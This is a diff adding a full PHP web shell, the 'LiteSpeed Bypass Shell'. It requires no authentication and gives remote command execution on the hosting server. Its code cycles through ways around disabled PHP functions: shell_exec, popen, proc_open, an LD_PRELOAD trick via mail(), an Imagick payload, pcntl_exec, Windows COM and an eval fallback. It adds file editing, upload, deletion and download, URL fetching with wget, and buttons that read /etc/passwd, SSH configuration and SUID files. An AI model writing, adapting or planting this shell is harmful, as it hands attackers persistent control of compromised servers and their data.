@@ -1,0 +1,845 @@
+<?php
+// Enhanced Shell untuk Litespeed dengan Multi-Bypass
+header('Content-Type: text/html; charset=utf-8');
+error_reporting(0);
+ob_start();
+
+class LiteSpeedShell {
+    private $currentDir;
+    private $disabledFuncs;
+    private $bypassMethods = [];
+    
+    public function __construct() {
+        $this->currentDir = isset($_GET['cd']) ? $this->sanitizePath($_GET['cd']) : getcwd();
+        if(!$this->currentDir || !is_dir($this->currentDir)) $this->currentDir = getcwd();
+        chdir($this->currentDir);
+        $this->currentDir = realpath(getcwd());
+        
+        $this->disabledFuncs = ini_get('disable_functions') ?: '';
+        $this->initBypassMethods();
+    }
+    
+    private function sanitizePath($path) {
+        $path = str_replace(['../', './', '..\\', '.\\'], '', $path);
+        $real = realpath($path);
+        return $real ? $real : getcwd();
+    }
+    
+    private function initBypassMethods() {
+        // Method 1: PHP Built-in functions
+        $this->bypassMethods = [
+            'shell_exec' => function($c) {
+                return @shell_exec($c . ' 2>&1');
+            },
+            'exec' => function($c) {
+                @exec($c . ' 2>&1', $output);
+                return implode("\n", $output);
+            },
+            'system' => function($c) {
+                ob_start();
+                @system($c . ' 2>&1');
+                return ob_get_clean();
+            },
+            'passthru' => function($c) {
+                ob_start();
+                @passthru($c . ' 2>&1');
+                return ob_get_clean();
+            },
+            'popen' => function($c) {
+                $handle = @popen($c . ' 2>&1', 'r');
+                if(!$handle) return false;
+                $output = '';
+                while(!feof($handle)) {
+                    $output .= fread($handle, 4096);
+                }
+                pclose($handle);
+                return $output;
+            },
+            'proc_open' => function($c) {
+                $descriptorspec = [
+                    0 => ["pipe", "r"],
+                    1 => ["pipe", "w"],
+                    2 => ["pipe", "w"]
+                ];
+                $process = @proc_open($c, $descriptorspec, $pipes);
+                if(!is_resource($process)) return false;
+                
+                fclose($pipes[0]);
+                $output = stream_get_contents($pipes[1]);
+                $error = stream_get_contents($pipes[2]);
+                
+                fclose($pipes[1]);
+                fclose($pipes[2]);
+                proc_close($process);
+                
+                return $output . ($error ? "\nError: " . $error : '');
+            },
+            'backticks' => function($c) {
+                return @`$c 2>&1`;
+            }
+        ];
+        
+        // Method 2: PHP functions that can execute commands indirectly
+        $this->bypassMethods['mail_ld_preload'] = function($c) {
+            if(function_exists('mail')) {
+                $temp = tempnam(sys_get_temp_dir(), 'ex_');
+                file_put_contents($temp, "#!/bin/sh\n" . $c . "\n");
+                chmod($temp, 0755);
+                putenv("LD_PRELOAD=" . $temp);
+                @mail('', '', '', '');
+                unlink($temp);
+                putenv("LD_PRELOAD");
+                return "[+] LD_PRELOAD attempt completed";
+            }
+            return false;
+        };
+        
+        // Method 3: ImageMagick bypass
+        $this->bypassMethods['imagick'] = function($c) {
+            if(class_exists('Imagick')) {
+                $temp = tempnam(sys_get_temp_dir(), 'img_');
+                $cmd = escapeshellarg($c);
+                $payload = "vid:msl:/tmp/php*;{$cmd}";
+                try {
+                    $img = new Imagick();
+                    $img->readImage($payload);
+                    return "[+] Imagick bypass attempted";
+                } catch(Exception $e) {
+                    return false;
+                }
+            }
+            return false;
+        };
+        
+        // Method 4: PCNTL functions
+        $this->bypassMethods['pcntl_exec'] = function($c) {
+            if(function_exists('pcntl_exec')) {
+                $args = explode(' ', $c);
+                $program = array_shift($args);
+                pcntl_exec($program, $args);
+                return "[+] PCNTL executed";
+            }
+            return false;
+        };
+        
+        // Method 5: COM objects (Windows)
+        $this->bypassMethods['com_windows'] = function($c) {
+            if(class_exists('COM')) {
+                try {
+                    $wsh = new COM("WScript.Shell");
+                    $exec = $wsh->exec($c);
+                    $stdout = $exec->StdOut->ReadAll();
+                    return $stdout;
+                } catch(Exception $e) {
+                    return false;
+                }
+            }
+            return false;
+        };
+    }
+    
+    public function execute($command) {
+        $command = trim($command);
+        
+        // Handle CD command
+        if(preg_match('/^\s*cd\s+(.+)$/', $command, $matches)) {
+            $newDir = trim($matches[1], " \t\n\r\0\x0B\"'");
+            if($newDir == '~' || $newDir == '$HOME') {
+                $newDir = isset($_SERVER['HOME']) ? $_SERVER['HOME'] : '/';
+            }
+            
+            if($newDir == '..') {
+                $newDir = dirname($this->currentDir);
+            }
+            
+            if(is_dir($newDir)) {
+                $this->currentDir = realpath($newDir);
+                chdir($this->currentDir);
+                return "Changed directory to: " . $this->currentDir;
+            } elseif(is_dir($this->currentDir . '/' . $newDir)) {
+                $this->currentDir = realpath($this->currentDir . '/' . $newDir);
+                chdir($this->currentDir);
+                return "Changed directory to: " . $this->currentDir;
+            } else {
+                return "Directory not found: " . $newDir;
+            }
+        }
+        
+        // Execute actual command
+        foreach($this->bypassMethods as $method => $callback) {
+            if(!$this->isDisabled($method)) {
+                $result = $callback($command);
+                if($result !== false && $result !== null && trim($result) !== '') {
+                    return $result;
+                }
+            }
+        }
+        
+        // Fallback: Direct PHP execution
+        if(function_exists('eval')) {
+            ob_start();
+            eval("system('$command 2>&1');");
+            return ob_get_clean();
+        }
+        
+        return "All execution methods failed or disabled";
+    }
+    
+    private function isDisabled($func) {
+        return stripos($this->disabledFuncs, $func) !== false;
+    }
+    
+    public function getCurrentDir() {
+        return $this->currentDir;
+    }
+    
+    public function listFiles($dir = null) {
+        $targetDir = $dir ?: $this->currentDir;
+        $files = @scandir($targetDir);
+        if(!$files) return "Cannot read directory";
+        
+        $output = "<table class='file-table'>";
+        $output .= "<tr><th>Type</th><th>Name</th><th>Size</th><th>Permissions</th><th>Modified</th><th>Actions</th></tr>";
+        
+        // Parent directory
+        if($targetDir != '/') {
+            $parent = dirname($targetDir);
+            $output .= "<tr class='folder'>
+                <td>📁</td>
+                <td><a href='?cd=" . urlencode($parent) . "'>..</a></td>
+                <td>-</td>
+                <td>-</td>
+                <td>-</td>
+                <td><button onclick=\"setCd('" . htmlspecialchars($parent) . "')\">Open</button></td>
+            </tr>";
+        }
+        
+        foreach($files as $file) {
+            if($file == '.' || $file == '..') continue;
+            
+            $fullPath = $targetDir . '/' . $file;
+            $isDir = is_dir($fullPath);
+            $perms = $this->getPermissions($fullPath);
+            $size = $isDir ? '-' : $this->formatSize(filesize($fullPath));
+            $modified = date('Y-m-d H:i', filemtime($fullPath));
+            
+            $output .= "<tr class='" . ($isDir ? 'folder' : 'file') . "'>
+                <td>" . ($isDir ? '📁' : '📄') . "</td>
+                <td>";
+            
+            if($isDir) {
+                $output .= "<a href='?cd=" . urlencode($fullPath) . "'>" . htmlspecialchars($file) . "</a>";
+            } else {
+                $output .= htmlspecialchars($file);
+            }
+            
+            $output .= "</td>
+                <td>{$size}</td>
+                <td>{$perms}</td>
+                <td>{$modified}</td>
+                <td>";
+            
+            if(!$isDir) {
+                $output .= "<button onclick=\"editFile('" . htmlspecialchars($fullPath) . "')\">Edit</button> ";
+                $output .= "<button onclick=\"downloadFile('" . htmlspecialchars($fullPath) . "')\">Download</button> ";
+            }
+            $output .= "<button onclick=\"deleteFile('" . htmlspecialchars($fullPath) . "')\">Delete</button>
+                </td>
+            </tr>";
+        }
+        
+        $output .= "</table>";
+        return $output;
+    }
+    
+    private function getPermissions($file) {
+        if(!file_exists($file)) return '----';
+        $perms = fileperms($file);
+        $info = '';
+        $info .= ($perms & 0x0100) ? 'r' : '-';
+        $info .= ($perms & 0x0080) ? 'w' : '-';
+        $info .= ($perms & 0x0040) ? 'x' : '-';
+        $info .= ($perms & 0x0020) ? 'r' : '-';
+        $info .= ($perms & 0x0010) ? 'w' : '-';
+        $info .= ($perms & 0x0008) ? 'x' : '-';
+        $info .= ($perms & 0x0004) ? 'r' : '-';
+        $info .= ($perms & 0x0002) ? 'w' : '-';
+        $info .= ($perms & 0x0001) ? 'x' : '-';
+        return $info;
+    }
+    
+    private function formatSize($bytes) {
+        if($bytes == 0) return "0 B";
+        $units = ['B', 'KB', 'MB', 'GB', 'TB'];
+        $i = floor(log($bytes, 1024));
+        return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
+    }
+    
+    public function editFile($path, $content = null) {
+        if(!file_exists($path)) return "File not found";
+        
+        if($content === null) {
+            // Read file
+            $content = file_get_contents($path);
+            return [
+                'content' => $content,
+                'path' => $path,
+                'size' => filesize($path)
+            ];
+        } else {
+            // Write file
+            if(!is_writable($path)) {
+                if(!chmod($path, 0644)) {
+                    return "Cannot write to file (permission denied)";
+                }
+            }
+            file_put_contents($path, $content);
+            return "File saved successfully";
+        }
+    }
+}
+
+// Initialize shell
+$shell = new LiteSpeedShell();
+$output = '';
+$action = $_REQUEST['action'] ?? '';
+
+// Handle actions
+switch($action) {
+    case 'exec':
+        if(isset($_POST['cmd'])) {
+            $output = $shell->execute($_POST['cmd']);
+        }
+        break;
+        
+    case 'browse':
+        $dir = $_GET['dir'] ?? $shell->getCurrentDir();
+        $output = $shell->listFiles($dir);
+        break;
+        
+    case 'edit':
+        if(isset($_POST['filepath']) && isset($_POST['content'])) {
+            $output = $shell->editFile($_POST['filepath'], $_POST['content']);
+        } elseif(isset($_GET['file'])) {
+            $result = $shell->editFile($_GET['file']);
+            if(is_array($result)) {
+                $editFile = $result;
+            }
+        }
+        break;
+        
+    case 'upload':
+        if(isset($_FILES['uploadfile'])) {
+            $target = $shell->getCurrentDir() . '/' . basename($_FILES['uploadfile']['name']);
+            if(move_uploaded_file($_FILES['uploadfile']['tmp_name'], $target)) {
+                chmod($target, 0644);
+                $output = "File uploaded: " . basename($_FILES['uploadfile']['name']);
+            } else {
+                $output = "Upload failed";
+            }
+        }
+        break;
+        
+    case 'delete':
+        if(isset($_GET['file'])) {
+            if(unlink($_GET['file'])) {
+                $output = "File deleted";
+            } else {
+                $output = "Delete failed";
+            }
+        }
+        break;
+        
+    case 'download':
+        if(isset($_GET['file']) && file_exists($_GET['file'])) {
+            header('Content-Type: application/octet-stream');
+            header('Content-Disposition: attachment; filename="' . basename($_GET['file']) . '"');
+            readfile($_GET['file']);
+            exit;
+        }
+        break;
+}
+
+// Get system info
+$sysinfo = $shell->execute('uname -a; whoami; pwd');
+$disabled = ini_get('disable_functions');
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Advanced LiteSpeed Shell</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+        
+        body {
+            background: #0a0a0a;
+            color: #00ff00;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            background: #111;
+            border: 1px solid #00aa00;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .header h1 {
+            color: #00ff00;
+            margin-bottom: 15px;
+            font-size: 24px;
+        }
+        
+        .sysinfo {
+            background: #111;
+            padding: 15px;
+            border: 1px solid #333;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        
+        .sysinfo pre {
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        
+        .panel {
+            background: #111;
+            border: 1px solid #00aa00;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .panel-title {
+            color: #00ff00;
+            margin-bottom: 15px;
+            font-size: 18px;
+            border-bottom: 1px solid #333;
+            padding-bottom: 10px;
+        }
+        
+        input, textarea, select, button {
+            background: #000;
+            color: #00ff00;
+            border: 1px solid #00aa00;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 5px 0;
+            font-size: 14px;
+        }
+        
+        textarea {
+            width: 100%;
+            min-height: 200px;
+            resize: vertical;
+        }
+        
+        button {
+            background: #003300;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        button:hover {
+            background: #006600;
+        }
+        
+        .file-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        
+        .file-table th {
+            background: #001a00;
+            padding: 10px;
+            text-align: left;
+            border: 1px solid #003300;
+        }
+        
+        .file-table td {
+            padding: 8px;
+            border: 1px solid #333;
+            vertical-align: top;
+        }
+        
+        .file-table tr.folder {
+            background: rgba(0, 50, 0, 0.2);
+        }
+        
+        .file-table tr.file:hover {
+            background: rgba(0, 50, 0, 0.3);
+        }
+        
+        .file-table a {
+            color: #00ff00;
+            text-decoration: none;
+        }
+        
+        .file-table a:hover {
+            text-decoration: underline;
+        }
+        
+        .tab-container {
+            display: flex;
+            border-bottom: 1px solid #333;
+            margin-bottom: 20px;
+        }
+        
+        .tab {
+            padding: 10px 20px;
+            cursor: pointer;
+            border: 1px solid transparent;
+            border-bottom: none;
+            border-radius: 5px 5px 0 0;
+        }
+        
+        .tab.active {
+            background: #001a00;
+            border-color: #00aa00;
+            border-bottom-color: #111;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .output {
+            background: #000;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 15px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 400px;
+            overflow-y: auto;
+            border: 1px solid #333;
+        }
+        
+        .quick-cmds {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 10px;
+            margin: 15px 0;
+        }
+        
+        .status-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #111;
+            border-top: 1px solid #00aa00;
+            padding: 10px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+        }
+        
+        .cmd-input {
+            width: calc(100% - 120px);
+            padding: 12px;
+            font-size: 16px;
+        }
+        
+        .execute-btn {
+            width: 110px;
+            padding: 12px;
+            font-size: 16px;
+            background: #006600;
+        }
+        
+        .form-row {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            margin: 10px 0;
+        }
+        
+        .current-path {
+            color: #00cc00;
+            font-weight: bold;
+            margin: 10px 0;
+            padding: 10px;
+            background: rgba(0, 50, 0, 0.3);
+            border-radius: 4px;
+        }
+        
+        .action-buttons {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 15px 0;
+        }
+    </style>
+    <script>
+        function showTab(tabName) {
+            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+            
+            document.querySelector(`.tab[onclick="showTab('${tabName}')"]`).classList.add('active');
+            document.getElementById(tabName).classList.add('active');
+        }
+        
+        function setCommand(cmd) {
+            document.getElementById('commandInput').value = cmd;
+            showTab('terminal');
+        }
+        
+        function setCd(path) {
+            window.location.href = '?cd=' + encodeURIComponent(path);
+        }
+        
+        function editFile(path) {
+            window.location.href = '?action=edit&file=' + encodeURIComponent(path);
+        }
+        
+        function downloadFile(path) {
+            window.location.href = '?action=download&file=' + encodeURIComponent(path);
+        }
+        
+        function deleteFile(path) {
+            if(confirm('Delete ' + path + '?')) {
+                window.location.href = '?action=delete&file=' + encodeURIComponent(path);
+            }
+        }
+        
+        function uploadFile() {
+            document.getElementById('uploadForm').submit();
+        }
+        
+        function executeQuick(cmd) {
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = '';
+            
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = 'cmd';
+            input.value = cmd;
+            
+            const actionInput = document.createElement('input');
+            actionInput.type = 'hidden';
+            actionInput.name = 'action';
+            actionInput.value = 'exec';
+            
+            form.appendChild(input);
+            form.appendChild(actionInput);
+            document.body.appendChild(form);
+            form.submit();
+        }
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            showTab('terminal');
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>⚡ LiteSpeed Bypass Shell</h1>
+            <div class="sysinfo">
+                <strong>Current Directory:</strong> <?php echo htmlspecialchars($shell->getCurrentDir()); ?><br>
+                <strong>Disabled Functions:</strong> <?php echo htmlspecialchars($disabled ?: 'None'); ?>
+                <pre><?php echo htmlspecialchars($sysinfo); ?></pre>
+            </div>
+        </div>
+        
+        <div class="tab-container">
+            <div class="tab active" onclick="showTab('terminal')">💻 Terminal</div>
+            <div class="tab" onclick="showTab('files')">📁 File Browser</div>
+            <div class="tab" onclick="showTab('edit')">✏️ Editor</div>
+            <div class="tab" onclick="showTab('upload')">⬆️ Upload</div>
+            <div class="tab" onclick="showTab('tools')">🔧 Tools</div>
+        </div>
+        
+        <!-- Terminal Tab -->
+        <div id="terminal" class="tab-content active">
+            <div class="panel">
+                <div class="panel-title">Execute Command</div>
+                <form method="POST">
+                    <input type="hidden" name="action" value="exec">
+                    <div class="form-row">
+                        <input type="text" name="cmd" id="commandInput" 
+                               placeholder="Enter command (use 'cd dir' to change directory)" 
+                               value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : 'pwd'; ?>"
+                               class="cmd-input">
+                        <button type="submit" class="execute-btn">Execute</button>
+                    </div>
+                </form>
+                
+                <div class="quick-cmds">
+                    <?php
+                    $quickCommands = [
+                        'pwd' => 'Show Path',
+                        'ls -la' => 'List Files',
+                        'whoami' => 'User',
+                        'uname -a' => 'System Info',
+                        'cd /' => 'Go to Root',
+                        'cd ..' => 'Go Up',
+                        'id' => 'User Info',
+                        'php -v' => 'PHP Version',
+                        'df -h' => 'Disk Space',
+                        'free -m' => 'Memory',
+                        'ps aux' => 'Processes',
+                        'netstat -tulpn' => 'Network',
+                        'cat /etc/passwd' => 'Users',
+                        'find / -type f -name "*.php" 2>/dev/null | head -20' => 'Find PHP',
+                        'wget --help' => 'Test Wget',
+                        'curl --help' => 'Test Curl',
+                        'python3 --version' => 'Python',
+                        'perl --version' => 'Perl'
+                    ];
+                    
+                    foreach($quickCommands as $cmd => $desc): ?>
+                        <button onclick="setCommand('<?php echo htmlspecialchars($cmd); ?>')" 
+                                title="<?php echo htmlspecialchars($desc); ?>">
+                            <?php echo htmlspecialchars($desc); ?>
+                        </button>
+                    <?php endforeach; ?>
+                </div>
+                
+                <?php if(isset($output) && $action == 'exec'): ?>
+                    <div class="panel-title">Output</div>
+                    <div class="output"><?php echo htmlspecialchars($output); ?></div>
+                <?php endif; ?>
+            </div>
+        </div>
+        
+        <!-- File Browser Tab -->
+        <div id="files" class="tab-content">
+            <div class="panel">
+                <div class="panel-title">File Browser - <?php echo htmlspecialchars($shell->getCurrentDir()); ?></div>
+                <div class="action-buttons">
+                    <button onclick="setCd('<?php echo dirname($shell->getCurrentDir()); ?>')">⬆ Parent</button>
+                    <button onclick="setCd('/')">🏠 Root</button>
+                    <button onclick="setCd('<?php echo getenv('HOME') ?: '/tmp'; ?>')">🏡 Home</button>
+                    <button onclick="setCd('/tmp')">📦 Temp</button>
+                    <button onclick="setCd('/var/www')">🌐 WWW</button>
+                </div>
+                <?php echo $shell->listFiles(); ?>
+            </div>
+        </div>
+        
+        <!-- Editor Tab -->
+        <div id="edit" class="tab-content">
+            <div class="panel">
+                <div class="panel-title">File Editor</div>
+                <?php if(isset($editFile)): ?>
+                    <form method="POST">
+                        <input type="hidden" name="action" value="edit">
+                        <input type="hidden" name="filepath" value="<?php echo htmlspecialchars($editFile['path']); ?>">
+                        
+                        <div class="form-row">
+                            <strong>File:</strong> <?php echo htmlspecialchars($editFile['path']); ?>
+                            <strong>Size:</strong> <?php echo $editFile['size']; ?> bytes
+                        </div>
+                        
+                        <textarea name="content" id="fileContent"><?php 
+                            echo htmlspecialchars($editFile['content']); 
+                        ?></textarea>
+                        
+                        <div class="form-row">
+                            <button type="submit">Save File</button>
+                            <button type="button" onclick="window.location.reload()">Cancel</button>
+                        </div>
+                    </form>
+                <?php elseif(isset($output) && $action == 'edit'): ?>
+                    <div class="output"><?php echo htmlspecialchars($output); ?></div>
+                    <button onclick="showTab('files')">Back to Files</button>
+                <?php else: ?>
+                    <p>Select a file to edit from the File Browser tab.</p>
+                <?php endif; ?>
+            </div>
+        </div>
+        
+        <!-- Upload Tab -->
+        <div id="upload" class="tab-content">
+            <div class="panel">
+                <div class="panel-title">File Upload</div>
+                <form method="POST" enctype="multipart/form-data" id="uploadForm">
+                    <input type="hidden" name="action" value="upload">
+                    
+                    <div class="form-row">
+                        <label>Upload to: <?php echo htmlspecialchars($shell->getCurrentDir()); ?></label>
+                    </div>
+                    
+                    <div class="form-row">
+                        <input type="file" name="uploadfile">
+                        <button type="submit">Upload File</button>
+                    </div>
+                    
+                    <div class="form-row">
+                        <strong>Upload via URL:</strong>
+                        <input type="text" placeholder="http://example.com/file.txt" id="urlInput">
+                        <button type="button" onclick="executeQuick('wget -O ' + 
+                            encodeURIComponent('<?php echo $shell->getCurrentDir(); ?>/downloaded.file') + 
+                            ' ' + document.getElementById('urlInput').value)">Download</button>
+                    </div>
+                </form>
+                
+                <?php if(isset($output) && $action == 'upload'): ?>
+                    <div class="output"><?php echo htmlspecialchars($output); ?></div>
+                <?php endif; ?>
+            </div>
+        </div>
+        
+        <!-- Tools Tab -->
+        <div id="tools" class="tab-content">
+            <div class="panel">
+                <div class="panel-title">System Tools</div>
+                
+                <div class="quick-cmds">
+                    <button onclick="executeQuick('phpinfo()')">PHP Info</button>
+                    <button onclick="executeQuick('getenv()')">Environment</button>
+                    <button onclick="executeQuick('ls -la /etc/passwd')">Passwd</button>
+                    <button onclick="executeQuick('cat /proc/version')">Kernel</button>
+                    <button onclick="executeQuick('service --status-all 2>/dev/null')">Services</button>
+                    <button onclick="executeQuick('crontab -l 2>/dev/null')">Cron Jobs</button>
+                    <button onclick="executeQuick('iptables -L 2>/dev/null')">Firewall</button>
+                    <button onclick="executeQuick('find / -perm -4000 2>/dev/null')">SUID Files</button>
+                    <button onclick="executeQuick('cat /etc/ssh/sshd_config 2>/dev/null')">SSH Config</button>
+                    <button onclick="executeQuick('netstat -rn')">Routing</button>
+                </div>
+                
+                <div class="panel-title" style="margin-top: 20px;">Bypass Tests</div>
+                <div class="action-buttons">
+                    <button onclick="executeQuick('echo Testing shell_exec... && whoami')">Test shell_exec</button>
+                    <button onclick="executeQuick('echo Testing exec... && pwd')">Test exec</button>
+                    <button onclick="executeQuick('echo Testing system... && id')">Test system</button>
+                    <button onclick="executeQuick('echo Testing popen... && uname -a')">Test popen</button>
+                    <button onclick="executeQuick('echo Testing proc_open... && hostname')">Test proc_open</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="status-bar">
+        <span>Path: <?php echo htmlspecialchars($shell->getCurrentDir()); ?></span>
+        <span>Disabled: <?php echo htmlspecialchars($disabled ?: 'None'); ?></span>
+        <span>UID: <?php echo getmyuid(); ?></span>
+    </div>
+</body>
+</html>
